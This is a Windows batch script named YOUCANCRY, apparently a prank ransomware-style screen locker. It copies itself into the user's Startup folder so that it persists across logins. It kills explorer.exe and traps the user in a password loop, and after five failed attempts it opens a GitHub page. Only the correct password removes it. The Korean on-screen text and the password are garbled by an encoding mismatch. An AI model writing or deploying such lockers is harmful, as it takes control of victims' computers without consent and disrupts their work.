@echo off

cls
color 47
if exist "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\YOUCANCRY.bat" goto b
copy "YOUCANCRY.bat" "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
:b
taskkill /f /im explorer.exe
title YOUCANCRY
cls
echo YOUCANCRY 1.1.0
echo �ȳ�! ���� ��ǻ�ʹ� ���� ��������! ��.. ��Ȯ�� ���ϸ� �� YOUCANCRY�� ������!

echo alt�� �Ҽ��ִ� ������ ������, �ϰ� �������̶�� �̹� �غ����Ŷ�� ������.
echo �׷��� �� ��й�ȣ�� ���纸�°��� ��õ��!
echo ���� �ϰ� 5�� Ʋ���ٸ� ���� ������ �˷��ٰ�!
set what=0
:a
set /p passwd=��й�ȣ:
if %passwd%==���¸�û�̴� goto case2

:case1
cls
set /a what=%what%+1
if %what%==5 goto case3
echo �ٽ� �����غ�.
goto a

:case2
cls
echo �� ���� ��û�̱���!
if exist "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
del "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\YOUCANCRY.bat" )
pause
start C:\windows\explorer.exe
goto case4

:case3
echo �˾Ҿ�...
echo ��Ʈ�� �ٰ�
start "" https://github.com/firecomputer/YOUCANCRY
goto a

:case4

